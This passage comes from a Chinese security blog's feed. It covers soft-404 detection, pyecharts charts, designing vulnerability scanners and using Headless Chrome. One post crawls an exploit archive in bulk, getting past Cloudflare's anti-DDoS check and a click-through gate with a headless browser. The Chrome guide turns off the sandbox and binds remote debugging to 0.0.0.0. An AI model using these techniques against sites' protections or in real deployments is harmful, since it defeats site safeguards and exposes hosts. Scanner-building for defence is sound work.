    <content type="text"><![CDATA[也许老街的腔调，是属于我的忧伤 写过爬虫或者漏洞扫描器的朋友肯定遇到过一个问题，就是如何判断一个url对应的页面是个404页面，因为这对之后的逻辑判断尤为重要。然而由于存在一些特殊情况，导致404页面判断没有想象中的那么简单，这往往跟服务器配置有关。本篇作为《漫谈漏洞扫描器的设计与开发》的一个分支文章，重点谈谈如何判断一个页面是否为404页面。 404页面 一般情况下，判断一个网页是否为404页面，主要看其返回的响应码。若响应码为404，则说明这是一个不存在的页面，若不是则说明是一个存在的页面。然而出于对用户的友好，有些网站往往会优化404页面，大致有以下几种优化方式。 跳转到指定页面 第一种优化方式是：一旦用户访问了一个不存在的页面，服务器会将请求跳转到一个指定的url，往往是网站首页，或者是网站登陆页面。这种情况下，请求一个不存在的页面的响应码会从302变为200（服务端跳转），或者响应码直接为200（客户端跳转，用户可感）；网页内容为网站首页或者网站登陆页面等指定页面的内容。例子：http://didichuxing.com/nmask 跳转到优化后的404页面 第二种优化方式是：一旦用户访问了一个不存在的页面，服务器会将请求跳转到404页面，与第一种方式不同的是跳转后的这个页面确实是404页面，但是是经过特殊处理优化的。这种情况下，请求一个不存在的页面的响应码会从302变为200（服务端跳转），或者响应码为200（客户端跳转），网页内容为一个经过优化的404页面内容。例子：https://www.jd.com/nmask 直接显示404页面 第三种方式是：一旦用户访问了一个不存在的页面，页面直接显示为404页面（服务器默认）。这种情况下，请求一个不存在的页面的响应码可能是404（默认情况），也可能是200，页面内容为默认404或者处理后的404页面。例子：http://www.alibaba.com/nmask 总结404页面的特征 综上所诉，一个404页面的响应码可能为：404，302，200（当然不排除有其他情况）；一个404页面的页面内容可能是：网站首页内容（指定页面）、优化后的404页面内容、服务器默认的404页面内容。 如何科学的判断一个404页面？综上所诉，我们大致可以得到这样的判断逻辑：(伪代码如下)123456if 响应码 == 404: return this_is_404_pageelif 目标网页内容 与 网站404页面内容 相似： return this_is_404_pageelse: return this_is_not_404_page 但要通过以上的逻辑判断，需要解决两个问题。问题一：如何提前收集网站的404页面内容；问题二：如何判断目标网页内容与网站404页面内容是否相似。 先解决下问题一，这个比较好解决，我们可以构造一些不存在的路径（比如:/this_is_a_404_nmask_page），请求获取页面内容。 第二个问题比较麻烦，首先我们需要注意这里指的是网页相似而非相同。为何这里不直接判断是否相同呢？因为一些404页面内容包含随机因子，比如当前时间，或者页面包含一些推广的信息，导致每个404页面内容都有差异。因此如何判断目标网页内容与网站404页面内容是否相似，而非相同，才是识别一个网页是否为404页面的科学方法。 那么该如何判断2个网页是否相似呢？这里借鉴了判断文章相似性的算法—余弦相似性算法。那么什么叫余弦相似性算法，它又怎么用于判断网页相似性呢？请往下看。 余弦相似性算法介绍假设我们有需求：判断两篇文章是否相似？实现方案：（1）使用TF-IDF算法，找出两篇文章的关键词；（2）每篇文章各取出若干个关键词（比如20个），合并成一个集合，计算每篇文章对于这个集合中的词的词频（为了避免文章长度的差异，可以使用相对词频）；（3）生成两篇文章各自的词频向量；（4）计算两个向量的余弦相似度，值越大就表示越相似。 具体例子：句子A：我/喜欢/看/电视，不/喜欢/看/电影。句子B：我/不/喜欢/看/电视，也/不/喜欢/看/电影。 得出所有分词为：我，喜欢，看，电视，电影，不，也。 计算词频：（出现的次数）句子A：我 1，喜欢 2，看 2，电视 1，电影 1，不 1，也 0。句子B：我 1，喜欢 2，看 2，电视 1，电影 1，不 2，也 1。 计算词频向量：句子A：[1, 2, 2, 1, 1, 1, 0]句子B：[1, 2, 2, 1, 1, 2, 1] 我们可以把它们想象成空间中的两条线段,我们可以通过夹角的大小，来判断向量的相似程度。夹角越小，就代表越相似。 计算公式： 计算结果： 说明：余弦值越接近1，就表明夹角越接近0度，也就是两个向量越相似，这就叫”余弦相似性”。 基于余弦相似性算法的网页相似性判断方法下面列举了余弦相似性算法与汉明距离算法，测试发现对于判断网页相似性余弦相似性算法准确率更高一些。123456789101112131415161718192021222324252627282930313233343536373839一）网页标签相似性（筛选出网页所有标签，只选标签名称） 先计算出两个网页所有标签的向量： A：(a,b,c,d,e,f,g,a,b,c) B：(a,c,b,d,e,f,g,a,c) 1）计算A与B的汉明距离： a,b,c,d,e,f,g,a,b,c a,c,b,d,e,f,g,a,c —————————————————— 0 1 1 0 0 0 0 0 1 1 A与B的汉明距离为 1+1+1+1=4，相似度为：(10-4)/10=60% 2）计算A与B的余弦相似性： A: a 2 b 2 c 2 d 1 e 1 f 1 g 1 B: a 2 b 1 c 2 d 1 e 1 f 1 g 1 继续简化： A: [2,2,2,1,1,1,1] B: [2,1,2,1,1,1,1] 余弦相似性： 2*2+2*1+2*2+1*1+1*1+1*1+1*1 ------------------------------------------------------------------------------ ((2^2+2^2+2^2+1^2+1^2+1^2+1^2) ** 0.5) * ((2^2+1^2+2^2+1^2+1^2+1^2+1^2) ** 0.5) 14 = ------------- 4 * (13**0.5) = 0.97 即相似性为97%二）网页文本相似性计算与标签判断算法一样，只是需要筛选出网页文本，并进行分词 说明：汉明距离更注重顺序相似，比如一个网页的标签排序顺序是否相似；而余弦相似性更关注整体标签的个数关系，对顺序不敏感。汉明距离可以看成是点与点间的距离，余弦相似性可以看成是线与线之间的夹角或者说距离。 更加严谨的科学判断 通过余弦相似性算法，我们大致可以计算出两个网页的相似度。那么看似以上逻辑判断应该就可以判断出404页面了。然而实际情况还要更复杂些，比如如何设置相似度的阀值，还需要大量的打标数据去计算。再比如如何降低一些特殊url带来的误报。这里特殊的url包含网站首页、登陆页面等，因为当访问一些404页面时，可能会跳转到此页面上，导致网页相似性计算结果很接近。这些问题的解决方案这里就不介绍了。 判断404页面的测试接口基于以上理论，我自己部署了一个判断404页面的api接口，可供大家测试一下准确性。api接口地址：http://api.nmask.cn/not_exist_page_calculation/?target_url=http://www.baidu.com/nmask若遇到判断错误的url，可在下方留言，或者邮件：tzc@maskghost.com。]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>余弦相似性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pyecharts 可视化初探]]></title>
    <url>../../../../../../../../2018/04/09/1/</url>
    <content type="text"><![CDATA[纸短情长啊，诉不完当时年少，我的故事还是关于你呀 最近在开发web应用过程中，需要用到可视化展示功能，因此找了找Python相关的可视化模块。这里简单记录下pyecharts模块的用法。推荐它主要是因为其功能强大，可视化功能选择比较多，且使用比较简单。 pyecharts介绍 首先需要了解下pyecharts模块的运行机制，pyecharts是echarts的python-api，而echarts是百度开源的可视化框架。echarts是用来操作js文件的，因此pyecharts的出现其实是为了能够让python语言更好的对接echarts。简单来说，pyecharts会帮我们生成js文件。 安装pyecharts1pip install pyecharts 或者Github下载源码安装：https://github.com/pyecharts/pyecharts1234$ git clone https://github.com/pyecharts/pyecharts.git$ cd pyecharts$ pip install -r requirements.txt$ python setup.py install 简单使用pyecharts创建一个test.py文件，写入：123456789from pyecharts import Bar # 柱状图attr = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]v1 = [2.0, 4.9, 7.0, 23.2, 25.6, 76.7, 135.6, 162.2, 32.6, 20.0, 6.4, 3.3]v2 = [2.6, 5.9, 9.0, 26.4, 28.7, 70.7, 175.6, 182.2, 48.7, 18.8, 6.0, 2.3]bar = Bar("Bar chart", "precipitation and evaporation one year")bar.add("precipitation", attr, v1, mark_line=["average"], mark_point=["max", "min"])bar.add("evaporation", attr, v2, mark_line=["average"], mark_point=["max", "min"])bar.render() # 生成一个html文件 运行test.py，会在当前目录下生成一个render.html文件，即包含柱状图的网页。查看此html文件，会发现其生成了很多js代码。 说明：除了柱状图外，pyecharts还支持其他可视化展示，具体可参考官方文档：http://pyecharts.org/#/zh-cn/charts pyecharts+Django 前面介绍的是利用pyecharts生成一个存在可视化图表的html页面，那么怎么在Django或者Flask等Web框架中使用呢？即如何在视图层生成图表代码，传递到模版层渲染展示？这里只介绍如何在Django中使用pyecharts，其他web框架同理，可自行研究。 view视图层在Django项目的view.py文件内写入:12345678910111213141516171819202122from django.http import HttpResponsefrom pyecharts import PieREMOTE_HOST = "https://pyecharts.github.io/assets/js"def Pie_(): # 生成饼图 attr = ["衬衫", "羊毛衫", "雪纺衫", "裤子", "高跟鞋", "袜子"] v1 = [11, 12, 13, 10, 10, 10] pie = Pie("饼图示例") pie.add("", attr, v1, is_label_show=True) return piedef index(request): # 可视化展示页面 pie = Pie_() myechart=pie.render_embed() # 饼图 host=REMOTE_HOST # js文件源地址 script_list=pie.get_js_dependencies() # 获取依赖的js文件名称（只获取当前视图需要的js） return render(request,"index.html",&#123;"myechart":myechart,"host":host,"script_list":script_list&#125;) 说明：REMOTE_HOST可更换成本地地址，即先前往https://github.com/pyecharts/assets clone项目，再将项目中的js目录copy到Django项目的static/js目录下，然后更改代码中的REMOTE_HOST为：123REMOTE_HOST = "https://pyecharts.github.io/assets/js"改为：REMOTE_HOST = "../../static/js/js" Django路由在Django项目的urls.py文件内容写入：1url(r'^$',views.index, name="index"), 模版层在Django项目的templates目录下创建index.html文件，写入：12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;Proudly presented by PycCharts&lt;/title&gt; &#123;% for jsfile_name in script_list %&#125; &lt;script src="&#123;&#123; host &#125;&#125;/&#123;&#123; jsfile_name &#125;&#125;.js"&gt;&lt;/script&gt; # 加载js文件 &#123;% endfor %&#125;&lt;/head&gt;&lt;body&gt; &#123;&#123; myechart|safe &#125;&#125; # 显示可视化图表，注意要加safe，表示解析视图层传入的html内容&lt;/body&gt;&lt;/html&gt; 运行django1python manage.py runserver 打开浏览器：http://127.0.0.1:8000 参考资料官方文档：http://pyecharts.org/#/zh-cn/Github项目地址：https://github.com/pyecharts/pyecharts]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Pyecharts</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次爬虫批量爬取exp]]></title>
    <url>../../../../../../../../2018/03/27/1/</url>
    <content type="text"><![CDATA[磨刀不误砍柴工 最近需要收集一些exp，因此逛了逛exploit-db、国内exp搜索大全、seebug等几个exp收集的网站。由于需要批量获取漏洞信息以及对应的exp内容，因此心想有必要写一款爬虫去自动化收集漏洞exp。 选个target 前面三个网站都有丰富的exp资源，但是我并不打算从它们身上去爬取，这里介绍另外一个更牛逼的网站：0day.today（需要翻墙）。选取它的原因是exp更新的更快更丰富，且反爬虫策略做的比较一般。 分析URL结构选好目标后，先尝试分析下网页结构，比如需要判断是动态还是静态页面等特征。此网站算是动态的，其漏洞列表URL结构如下： cn.0day.today/webapps/1（web漏洞列表第一页） cn.0day.today/webapps/2（web漏洞列表第二页） cn.0day.today/remote/1（远程利用漏洞列表第一页） cn.0day.today/local/1（本地利用漏洞列表第一页） …… 每个漏洞列表页面内有30个漏洞列表，每个漏洞列表对应一个漏洞URL，结构如下： cn.0day.today/exploit/30029 cn.0day.today/exploit/30030 说明：此URL内容便是某个漏洞的exp，粗略算一下，web漏洞有600页，每页30个，总数是18000个漏洞exp。 分析网页内容 分析完URL结构，大致可以得出爬虫思路：遍历漏洞列表页数获取全部漏洞URL–&gt;爬取漏洞URL获取漏洞exp。 那么如何通过爬取漏洞列表页面获取漏洞对应的URL，以及如何爬取漏洞信息页面获取exp？，这里需要分析一下页面结构，可以尝试写正则或者摘取网页元素内容的方式获取目标内容。 获取漏洞URL页面结构：对于此页面我没有使用正则，而是使用了BeautifulSoup模块来获取网页元素内容，代码如下：12345678910soup=BeautifulSoup(content,"html.parser")n=soup.find_all("div",&#123;"class":"ExploitTableContent"&#125;)if n: for i in n: m=i.find_all("div",&#123;"class":"td allow_tip "&#125;) for j in m: y=j.find_all("a") for x in y: vul_name=x.text # 漏洞名称 vul_url=x.attrs.get("href") # 漏洞url 获取漏洞EXP页面结构：对于此页面我也没有使用正则，而是使用了BeautifulSoup模块来获取网页元素内容，代码如下：123456soup=BeautifulSoup(content,"html.parser")m=soup.find_all("div",&#123;"class":"container"&#125;)n=m[0].find_all("div")exp_info=""for i in n: exp_info+=i.text+"\n" 反爬虫策略我在连续访问n次网站后，发现此站有一些反爬虫的策略。而我必须研究解决它，才能进一步获取exp内容。 cdn防ddos策略 首先我发现此网站用了cloudflare加速器，且在用户持续访问一段时间后（应该是基于ip+headers认证），会出现防ddos页面。如果此时用普通的爬虫去访问，获取到的页面源码是防ddos的源码，即： 解决方案 当我们打开浏览器访问漏洞页面时，会在防ddos页面上等待几秒后，自动跳转到目标漏洞页面。基于这一特性，我决定使用无头浏览器去访问，设置等待时间即可。这里我选用phantomjs做此试验，其他headless同理。1234d=webdriver.PhantomJS()d.get(vul_api)time.sleep(5) # 等待5sprint d.page_source # 输出源码 在访问网页5s后，输出的网页源码，便是目标漏洞exp页面的源码。 用户点击确认 在绕过了防ddos策略后，发现网站自身也有一个反爬虫的策略，即需要用户点击确认按钮后，才能继续访问原目标。如果此时用普通的爬虫去访问，获取到的页面源码是用户确认网页的源码，即： 解决方案 此网页需要用户点击“确定”按钮后，会跳转到目标页面，因此可以使用无头浏览器访问，操作页面元素，即模拟点击确定按钮。12345678d=webdriver.PhantomJS()d.get(vul_api)time.sleep(5) # 等待5s（绕过防ddos策略）d.find_element_by_name("agree").click() # 点击确定按钮（绕过用户点击确认策略）time.sleep(5) # 等待5scontent=d.page_source # 输出网页源码d.quit() 总结 想要爬取一个网站的内容，必须要分析此网站的URL结构、网页内容、反爬虫策略等。针对此网站而言，复杂点在于如何绕过反爬虫策略，这里用到了无头浏览器去模拟人访问。总之编写爬虫是需要耐心跟细心的，如何一步步去分析整个访问流程，有时候比如何去编程更重要。也许，这就是所谓的：“磨刀不误砍柴工”吧！]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>exp</tag>
        <tag>phantomjs爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漫谈漏洞扫描器的设计与开发]]></title>
    <url>../../../../../../../../2018/03/16/1/</url>
    <content type="text"><![CDATA[世界の果てまで、君と離れたくない。 前几天在TSRC换了本《白帽子讲WEB扫描》，昨天凑空拜读了一遍。整体读下来的感觉是，书中关于WEB漏洞扫描器设计与开发所需的知识描述得比较全面，包括一些坑点也有涉及。但对于每一方面的内容描述得不够深入不够细致，适合从0开始学习设计开发漏洞扫描器的工程师，给其提供一些设计思路，避免一些不必要的坑点。当然设计开发扫描器本身就是一个很复杂的工程，作者也不可能在一本书中详细描述，再者有些坑还得自己踩过才知道。 本篇文章作为《白帽子讲WEB扫描》一书读后感，或者说读后总结，也算是本人对漏洞扫描器设计与开发的一次总结。在正式开始总结之前，先感谢下本书作者：刘漩，本文很多内容均借鉴此书，若有转载本文，请务必说明出处。 本文涉及到的知识点比较多，我先列个大致介绍目录，请容我慢慢补充完善.....因为篇幅有限，有些内容本文也只做简单介绍（比如爬虫开发），后面我会对每块内容单独成文详细介绍。 省略一些前言后语 关于为何要开发一款漏洞扫描器，以及不同扫描器（白、黑、灰）的区别、其作用、有何优缺点等问题，此处省略一万字…… 本文概要 本文主要介绍以下两种扫描器的设计与开发：1）基于URL的WEB漏洞扫描器、2）基于指纹的漏洞扫描器。目前市面上很多商业扫描器是包含这两种扫描功能的，但为了能更清楚的知道其原理，我觉得有必要分别介绍。有必要说明一下的是，本文介绍的扫描器均是主动型扫描器，即会主动发起http请求的。至于被动型扫描器，其主要利用http代理（burpsuite）或者流量镜像（绿盟某扫描器）的方式进行扫描，即不会主动发起请求，只是获取请求的内容进行分析。 如何设计基于URL的WEB漏洞扫描器 从本节标题至少可以读出两点信息：第一漏洞扫描器的输入源是URL，第二漏洞扫描主要针对WEB。开发这样一款扫描器至少需要解决以下两个问题： 如何采集输入源（即采集网站URL） 基于流量清洗 基于日志提取 基于爬虫爬取 如何调用扫描插件（即对URL进行扫描） 从流量中获取URL数据 一般在甲方开发扫描器会涉及到此块内容，因为基于流量获取url是对业务影响最小，且覆盖面最全的一个方案。而一般乙方开发的商业扫描器很多没有涉及到流量清洗，因为部署等难点。 流量收集获取 可以从企业入口主交换机上镜像一份流量到某台服务器上，再通过一些工具从服务器网卡上获取流量，清洗后提取url、post_body、response等数据。获取流量的工具有很多，比如justniffer，suricata等。 流量中获取扫描源有何坑点 一般流量中是没有https数据的，因为无法解密；流量中包含用户认证信息，如何优雅地处理，使之对用法没有影响。 从日志中获取请求数据 一般在甲方开发扫描器会涉及到此块内容，因为基于日志获取url也是对业务影响很小，且覆盖面比较全的一个方案。 日志收集获取怎么在服务器上配置nginx收集日志就不说了，如果对于nginx不熟悉，可移步学习：nginx负载均衡 日志中获取扫描源有何坑点 一般不包含post_body，以及response数据，因为每天产生的日志量非常庞大，如果需要存储这么多数据的话，成本很高，所以一般在服务器上只记录url、时间戳等简单信息。 设计开发一款爬虫 区别于一般的网络爬虫，漏洞扫描涉及到的爬虫是针对同一个站点爬取所有URL的爬虫。想要开发一款好用的爬虫，前提是必须对HTTP协议熟悉。本文不展开介绍http协议，只总结开发爬虫过程中一些注意的点。如果对爬虫不甚了解，可以移步学习：Python爬虫基础（不好意思，还没写….）基于Python的漏洞扫描爬虫（不好意思，也还没写….） HEAD替代GET省资源 注意不是所有请求都用HEAD，而是一部分不需要响应主体的请求可以用HEAD代替GET。head请求唯一区别与get请求的是其不会返回响应主体，只有响应头。 有Cookie闯新大陆 有些网站有最基础的反爬策略（检测请求头），或者有些页面需要登录凭证（cookie认证），因此在爬虫中也需要在请求头中加上cookie。 DNS缓存来提速 当我们每次请求一个域名时，都会先向dns服务器获取域名对应的ip地址，而这个解析记录一般情况下是不太会变的，因此可以一开始爬取的时候解析一次，然后缓存到系统内，后面的请求直接从系统中获取，可以节省资源。 页面获取新URL涉及获取不同标签内的url，以及处理动态链接、静态链接，同源策略，重复url去除等。 处理页面跳转 页面跳转主要分为服务端跳转、客户端跳转，具体介绍可移步:【黑帽seo系列】页面跳转 。客户端跳转对用户是可见的，即在第一次请求时，响应码为301或者302，在响应头的Location中返回了跳转的地址，第二次请求跳转的地址，再返回结果；而服务端请求对用户不可见，即只有一次请求，跳转是在服务端处理的。 处理识别404页面 一般网页不存在，响应码便是404。但有些网站为了对用户友好，当访问不存在的页面是会跳转到一个存在的页面（响应码302、301），或者页面直接显示主页内容（响应码200），或者显示404提示页面（响应码200）。针对这些复杂的情况，仅仅对响应码进行判断显然是不够的，需要结合响应码跟页面内容。 解决方案：先访问一些不存在的页面，获取页面内容，标为C1；再访问目标页面，若响应码为404则表示页面不存在，若不为404，则比较页面源码C2与C1的相似性，若相似也表示不存在。关于如何判断一个页面为404页面的详细内容，请移步：https://thief.one/2018/04/12/1/ 处理重复URL 去除重复的URL，以免重复抓取相同的页面，当然对于一些相似的URL也需要处理。处理方案可以是将url hash以后存入内存中，比如python的list对象中，然后判断新的url的hash在不在此list中，不存在则将url放入队列进行爬取。 计算页面相似性具体可使用汉明距离计算，这对识别404页面有很大的帮助。 请求断开重试有些时候由于网络延迟，会导致请求断开，这时候就需要重试，直到次数达到重试次数阀值。 解析页面表单 如果单纯只是抓取页面中的URL，会少了很多请求，比如点击事件、表单发送等。获取表单信息比较简单，只要匹配页面中的form标签，以及其内部的input标签。当需要爬虫能够自动填充这些字段内容，比如电话字段，需要填充正确的电话号码，因为大部分网站会在前后端对数据格式进行校验。这就需要维护一个表单字段库，对于每个常见的字段都设置了常用值。 解析事件以及ajax请求 目前很多网页通过ajax发送请求，因此也要求我们的爬虫能够解析ajax请求。包括一些页面上的事件，也需要爬虫去触发。 Web2.0爬虫 web2.0与web1.0最大的区别，就是增加了很多动态的内容，很多页面内容是js动态生成的。因此这便要求我们的爬虫有解析js的能力。这里推荐几个模块，phantomjs、chromeheadless等。 维护漏洞库 简单来说，漏洞扫描器主要分为输入与扫描两大块功能，光有输入源还不行，必须得有扫描能力，而扫描能力主要依靠扫描插件的堆积。 如何优雅地对url进行重放请求 从流量中可以获取到一些url，以及post的数据信息（其中包含了认证），由于我们设计的是主动型扫描器，需要主动发起请求，因此如何去优雅地重放这些请求变成了一个难题。由于有些网站cookie过期时间很长，重放请求势必会造成对业务的影响，而不使用cookie，则很多页面无法访问到。 一种解决方案可以是对cookie进行替换，换成测试账户的cookie，这样就对用户没有影响了，但是其中的坑也很多。 如何设计基于指纹的漏洞扫描器 从本节标题也至少可以看出两个信息：第一漏洞扫描器的输入源是服务指纹，第二漏洞扫描针对WEB+服务。开发这样一款扫描器至少需要以下两个步骤： 采集输入源（即采集系统指纹） 端口扫描 指纹扫描 指纹匹配 调用扫描插件（即匹配指纹进行漏洞扫描） 开发端口扫描器 可以使用python的socket模块开发tcp扫描，或者用nmap、masscan、zmap等开源工具进行扫描。 开发指纹扫描器 可以使用nmap扫描，因为nmap内含了很多指纹探针，可以识别出大部分服务指纹信息。针对web指纹，则需要先发起http请求，获取响应内容，再借助web指纹库识别，或者借助开源的指纹扫描器，比如Whatweb等。 维护指纹库 只有指纹没有指纹库也是不行的，指纹好比是一些身份信息，而我们最终是要定位到某个人，因此还需要有一个指纹库，将指纹信息与人对应起来。 输入源-&gt;队列-&gt;任务分发-&gt;扫描节点-&gt;存储 如何设计 以上简单介绍了设计开发两种扫描器所需要解决的问题，而站在整体角度看，需要解决的问题还远远不够。比如当需要扫描的系统非常庞大时，如何进行分布式的部署，这就要求我们的扫描框架满足分布式部署的需求。 推荐技术栈：python+rabbitmq+celery+mysql 你以为只有这样就结束了？不不不，今天有点累了，过几天再继续补充，比如添加一些基础的代码以及再补充一些更细的内容。还有，网上有很多资料，我还得先整理学习一波。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>漏洞扫描器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Headless Chrome and API]]></title>
    <url>../../../../../../../../2018/03/06/1/</url>
    <content type="text"><![CDATA[我已爬遍了全世界，而你却迟迟不见 自从Google在chrome59版本后加入了 Headless Chrome，类似phantomjs、selenium等工具作者都放弃了维护自身的产品（原因可参考文章 QtWebkit or Headless Chrome）。因此作为使用者的我们也是时候放弃phantomjs，转而研究Headless Chrome了。由于网上对于Headless Chrome的资料还很少，因此我先收集整理一波，随后慢慢学习研究，渐渐将本篇内容补充完善。 Headless Chrome 介绍headless chrome意思是无头chrome浏览器，相对于传统的chrome浏览器，这是一个可以在后台用命令行操作浏览器的工具，对于爬虫编写以及web自动化测试都有很大的作用。相比较同类工具Phantomjs，其更加强大（主要因为其依赖的webkit更新）。 Headless Chrome 安装目前只支持mac与linux系统，需要下载chrome浏览器并安装。 mac install headless chromemac下直接去官网下载安装包即可，mac下chrome浏览器位置，为了方便使用，用alias别名启动。123alias chrome="/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome"alias chrome-canary="/Applications/Google\ Chrome\ Canary.app/Contents/MacOS/Google\ Chrome\ Canary"alias chromium="/Applications/Chromium.app/Contents/MacOS/Chromium" 下载chrome-canary版 说明：Mac 和 Linux 上的 Chrome 59 都可以运行无需显示模式。对 Windows 的支持将在 Chrome 60 中提供。要检查你使用的 Chrome 版本，请在浏览器中打开 chrome://version。 linux install headless chrome添加源：123456789vim /etc/yum.repos.d/chrome.repo写入以下内容：[google-chrome]name=google-chromebaseurl=http://dl.google.com/linux/chrome/rpm/stable/$basearchenabled=1gpgcheck=0gpgkey=https://dl-ssl.google.com/linux/linux_signing_key.pub 安装：1yum install -y google-chrome-stable 测试运行：1google-chrome --headless --print-to-pdf https://thief.one 报错处理：1Running as root without --no-sandbox is not supported # 错误信息 解析方案：123vim /opt/google/chrome/google-chrome找到 exec -a "$0" "$HERE/chrome" "$@"改为 exec -a "$0" "$HERE/chrome" "$@" --user-data-dir --no-sandbox 说明：若在安装过程中报错，则将源文件中的gpgcheck改为0 linux安装headless chrome参考：http://akai-tsuki.hatenablog.com/entry/2017/06/18/000000 Headless Chrome 基础用法HELP信息：123456chrome \--headless \ # Runs Chrome in headless mode.--disable-gpu \ # Temporarily needed for now.--remote-debugging-address=127.0.0.1--remote-debugging-port=9222 \ https://thief.one # URL to open. Defaults to about:blank. 访问一个网页获取源码–dump-dom 标志将打印 document.body.innerHTML 到标准输出：1chrome --headless --disable-gpu --dump-dom https://thief.one/ 访问一个网页将源码创建成一个PDF–print-to-pdf 标志将页面转出为 PDF 文件：1chrome --headless --disable-gpu --print-to-pdf https://thief.one/ 访问一个网页并截图使用–screenshot标志运行 Headless Chrome 将在当前工作目录中生成一个名为 screenshot.png的文件：1234chrome --headless --disable-gpu --screenshot https://thief.one/# 设置图片大小chrome --headless --disable-gpu --screenshot --window-size=1280,1696 https://thief.one/ 访问一个网页并进行js交互（REPL模式）–repl 标志可以使 Headless Chrome 运行在一个你可以使用浏览器评估 JS 表达式的模式下。执行下面的命令：1234chrome --headless --disable-gpu --repl https://thief.one&gt;&gt;&gt; location.href&#123;"result":&#123;"type":"string","value":"https://thief.one"&#125;&#125;&gt;&gt;&gt; quit 启动一个监听端口1chrome --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0 可以通过浏览器打开：http://0.0.0.0:9222 Headless Chrome API以上演示了使用命令行的方式操作headless chrome，那么怎么在代码中使用它呢？api工具如下：官方：puppeteer底层：chrome-remote-interface活跃：chromeless非官方：headless-chrome-crawler Python相关的API：pychromePyppeteer 推荐chromotechrome_remote_interface_python puppeteer 介绍Puppeteer 是一个由 Chrome 团队开发的 Node 库。它提供了一个高层次的 API 来控制无需显示版（或 完全版）的 Chrome。它与其他自动化测试库，如 Phantom 和 NightmareJS 相类似，但是只适用于最新版本的 Chrome。 puppeteer 安装1234mkdir puppeteer_test # 创建一个项目目录cd puppeteer_testnpm initnpm i --save puppeteer 安装puppeteer前需要在系统上安装nodejs与npm；安装完puppeteer，默认会自动安装最新版本的chromium。注意：系统默认安装的npm与nodejs版本都很低，而使用puppeteer需要node6.4.0+，async/await需要node7.6.0+，因此建议安装node7.6.0版本，否则会导致无法使用。 安装升级nodejs与npm要安装puppeteer，需要先安装npm与nodejs，而puppeteer对nodejs版本有要求，因此不能用系统默认安装的nodejs版本。12wget http://nodejs.org/dist/v7.6.0/node-v7.6.0-linux-x64.tar.gztar -zvxf node-v7.6.0-linux-x64.tar.gz 共享至全局123rm -rf /usr/bin/node /usr/bin/npmln -s /path/node-v7.6.0-linux-x64/bin/node /usr/bin/node ln -s /path/node-v7.6.0-linux-x64/bin/npm /usr/bin/npm 若用yum安装过nodejs，需要移除其他版本:12yum remove npmyum remove nodejs 查看nodejs与npm版本：12node -vnpm -v 安装升级nodejs过程参考：http://jeeinn.com/2017/02/236/ puppeteer 使用在使用puppeteer前，先要确定puppeteer、nodejs、npm安装成功（版本正确），且headless chrome安装成功。官方API文档：https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md 打印用户代理：在puppeteer_test目录下创建一个example1.js文件，写入：12345678910const puppeteer = require('puppeteer');(async() =&gt; &#123; const browser = await puppeteer.launch(&#123; headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'],&#125;); console.log(await browser.version()); browser.close();&#125;)(); 运行代码:1node example1.js 获取页面的屏幕截图：创建一个example2.js文件，写入：1234567891011121314const puppeteer = require('puppeteer');(async() =&gt; &#123;const browser = await puppeteer.launch(&#123; headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'],&#125;);const page = await browser.newPage();await page.goto('https://thief.one', &#123;waitUntil: 'networkidle2'&#125;);await page.pdf(&#123;path: 'screen.pdf', format: 'A4'&#125;);browser.close();&#125;)(); 运行代码：1node example2.js 说明：在运行puppeteer之前不需要额外开启一个headless-chrome进程，因为其本身就会去开启。 发送POST请求获取源码12345678910111213141516171819const puppeteer = require('puppeteer');puppeteer.launch(&#123;headless: true,args: ['--no-sandbox', '--disable-setuid-sandbox'],&#125;).then(async browser =&gt; &#123; const page = await browser.newPage(); await page.setRequestInterception(true); // 开启请求捕捉 page.on('request', interceptedRequest =&gt; &#123; const overrides = &#123;&#125;; //console.log(interceptedRequest.url()); // 输出捕捉到的请求URL if (interceptedRequest.url()=='http://127.0.0.1:8000/')&#123; overrides.method = 'POST'; overrides.postData = '&#123;"id":"2"&#125;'; &#125; interceptedRequest.continue(overrides); // 重放 &#125;); await page.goto('http://127.0.0.1:8000/'); await console.log(await page.content()); // 输出源码 await browser.close();&#125;); 安装puppeteer报错在linux下安装puppeteer报错，即:1npm i --save puppeteer 命令没有运行成功 失败原因可能是linux版本不支持，centos7下成功，centos6下测试失败。 运行puppeteer报错处理报错如下，说明代码语法有问题，或者node版本太低，不符合要求：1SyntaxError: Unexpected token function 报错如下，说明代码中需要设置headless状态为true1Failed to launch chrome 解决方案，修改代码为如下：1234const browser = await puppeteer.launch(&#123; headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'], &#125;); 报错如下，与上面解决方案一致：11025/084740.006078:ERROR:zygote_host_impl_linux.cc(88)] Running as root without --no-sandbox is not supported. See https://crbug.com/638180. pyppeteerpyppeteer模版是对puppeteer的python封装，因为puppeteer是用nodejs写的，所以要在python中使用得用pyppeteer模块。 pyppeteer安装pyppeteer模版只支持python3.5以上版本。1python3 -m pip install pyppeteer pyppeteer简单的例子截图：1234567891011import asynciofrom pyppeteer import launchasync def main(): browser = await launch(args=['--no-sandbox']) page = await browser.newPage() await page.goto('http://example.com') await page.screenshot(&#123;'path': 'example.png'&#125;) await browser.close()asyncio.get_event_loop().run_until_complete(main()) 说明：在使用pyppeteer时，不需要额外开启headless-chrome进程（与puppeteer一样）。更多pyppeteer模版使用方法，参考：https://miyakogi.github.io/pyppeteer/reference.html#page-class pyppeteer报错处理错误类似如下：1pyppeteer.errors.BrowserError: Failed to connect to browser port: http://127.0.0.1:58871/json/version 解决方案：123加上：args=['--no-sandbox']，同puppeteer类似。browser = await 